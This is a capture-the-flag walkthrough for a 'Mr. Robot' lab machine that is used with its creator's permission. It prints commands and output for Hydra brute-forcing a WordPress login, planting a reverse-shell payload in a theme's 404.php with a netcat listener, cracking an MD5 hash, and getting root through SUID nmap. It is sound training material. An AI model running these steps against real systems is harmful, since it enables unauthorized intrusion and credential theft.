### Task:1 Connect to our network 
```console
sudo openvpn your_vpn_name.ovpn
```
### Task2: Hack the machine

Can you root this `Mr. Robot` styled machine? This is a virtual machine meant for beginners/intermediate users. There are `3 hidden keys` located on the machine, can you find them?

>*Credit to `Leon Johnson` for creating this machine. This machine is used here with the explicit permission of the creator <3*

## Enumeration

Our first step is to identify the `open ports` and determine which services are running on them using an **Nmap scan**
```console
$ nmap -sCV 10.10.166.157
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 20:19 IST
Nmap scan report for 10.10.166.157
Host is up (0.18s latency).

```
We see that three ports are open let's start by examining port 80

You can try all the given commands, but they won't reveal the flag—they're just for fun. So, instead of wasting time, let's focus on finding hidden directories.

So, we'll use `Gobuster` to scan for hidden directories

```console
$ gobuster dir -u http://10.10.166.157 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

```

## First Key

You can simply navigate to the all directory we found. The `robots` file looks interesting—let's check what it contains`
```console
User-agent: *
fsocity.dic
key-1-of-3.txt
```
so we have two files: `fsocity.dic` and `key-1-of-3.txt`
The .dic file likely contains a list of `usernames and passwords`, which can be useful for `brute-force attacks`. Since it might help us gain **unauthorized access** to a service, the next step is to download it for analysis. We can use the wget command to download the `fsocity.dic` file directly from the target server
```console
$ wget http://10.10.166.157/fsocity.dic .
--2025-05-31 20:47:31--  http://10.10.166.157/fsocity.dic

fsocity.dic              100%[=================================>]   6.91M   568KB/s    in 16s     

2025-05-31 20:47:47 (455 KB/s) - ‘fsocity.dic’ saved [7245381/7245381]
```

The `key-1-of-3.txt` file contains the first key or you say `First Flag`
```console
$ curl http://10.10.166.157/key-1-of-3.txt
0739434[REDACTED]30724b9
```
![Robot](robot.gif){: width="800" height="150" .shadow }

## Second Key
So, we have the `fsocity.dic` file ready. First, let’s use `Hydra` to try and find the username by performing a **brute-force attack** with the wordlist

The website appears to be running on `WordPress`, and during our **directory brute-forcing**, we discovered the `wp-login.php` page

![Word Press](wordpress.png){: width="800" height="150" .shadow }

We used `Burp Suite` to intercept the login request to the wp-login.php page
When we enter an incorrect username or password on the wp-login.php page, the site displays an error message.
```console
ERROR: Invalid username. Lost your password?
```
The error message returned by the `login page` is useful because it helps us craft an effective Hydra command. By analyzing the response from incorrect login attempts, we can set a condition in Hydra to recognize failed logins. This allows `Hydra` to differentiate between valid and `invalid credentials` based on the presence or absence of specific error messages in the response.

so first we find the `username`

```console
$ hydra -L fsocity.dic -p hacker 10.10.166.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 20
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-31 21:04:04
[DATA] max 20 tasks per 1 server, overall 20 tasks, 858235 login tries (l:858235/p:1), ~42912 tries per task
[DATA] attacking http-post-form://10.10.166.157:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.166.157   login: Elliot   password: hacker
```
Now that we have a `valid username`, the next step is to find the correct password. When we enter the correct username but an incorrect password, the server returns a specific error message.

```console
ERROR: The password you entered for the username Elliot is incorrect. Lost your password?
```
This response is useful because it allows us to distinguish between valid and invalid login attempts
I was using the same command for the password brute-force attack, but for some reason, it didn’t work properly and took a lot of time. So instead, I used a different command that performed better and was more efficient

>*For the sake of crafting the Hydra command correctly, we simply intercept the login request *

```console

>The `fsociety.dic` file is quite large, so let's sort it and extract only the unique entries into a new file.
```console
$ sort fsocity.dic| uniq -u > fsco.dic
```
{: .prompt-tip}

Now that we have both the `username and password`, let’s proceed to log in to the WordPress login page.

After login we will see that below image

![Wordpress](alder.png){: width="800" height="150" .shadow }

The next step is to exploit the WordPress site. However, we don’t yet know how to exploit it or which plugins might be vulnerable. To figure this out, we’ll use **WPScan** to scan the remote IP and identify any vulnerable plugins.

```console
wpscan --url http://10.10.88.34 --enumerate vp
              [REDACTED]
[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.88.34/wp-content/themes/twentyfifteen/

 |  - http://10.10.88.34/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
```

We’ve identified a vulnerable plugin, and `WPScan` also provided its path. So, we can simply place our payload there to achieve remote code execution **(RCE)**
You can use any available template file like **404.php, xmlrpc.php**, or others to inject your payload. In this case, I’m using 404.php I simply pasted the payload into that file to execute it.

![Wordpress0](404.png){: width="800" height="150" .shadow }

>*Remember change your ip to tun0* 

![Wordpress2](ipp.png){: width="800" height="150" .shadow }

After pasting the payload, click on Update File to save the changes. But before executing it, make sure to run `Netcat (nc)` to listen on the required port this way, you'll be ready to catch the **reverse shell** connection

```console
nc -lnvp 1234
```

Execute the payload by visiting the following path in your browser  
http://10.10.88.34/wordpress/wp-content/themes/twentyfifteen/404.php

Once the payload is executed, you’ll successfully get a **reverse shell connection**
![Shell](shell.png){: width="800" height="150" .shadow }

🐍 Stable Shell via Python 
```console
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
ctrl +z
stty raw -echo;fg
Press Enter
```
We can simply check the /home directory and see that there are two `users direcroty` present
![Demon](demon.png){: width="800" height="150" .shadow }

If we navigate to the robot user’s directory and run the `ls` command, we can see the key file. However, we don’t have permission to read it.
```console
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

However,we do have permission to read the file named `password.raw-md5`
```console
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We use `John the Ripper` to crack the password. First, we save the hash into a file named `hash.txt` and also tell the format(md5). Then, using `John the Ripper` along with the popular `rockyou.txt wordlist`, we attempt to crack the password
```console
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=9
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
```
Now that we have the password for the `robot user`, we can switch to that account and read the `second key`
```console
robot@linux:~$ ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c7[REDACTED]93bede3eb39f959
```

![Happy](happy.gif){: width="800" height="150" .shadow }
## Third Key
Now, the final task is to find the `third key`
To access files in the `root directory`, we need to escalate our privileges. Our initial step is to list all the `SUID files` on the system and then check their potential exploits on `GTFOBins`
```console
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap                              <<<<<<<<<<<<<<<<<<
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Search `GTFObins` for nmap [here](https://gtfobins.github.io/gtfobins/nmap/)
```console
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```
Now that we have finally gained root access, we can read the third key
```console
cat /root/key-3-of-3.txt
04787d[REDACTED]dee161b21670b4e4
```
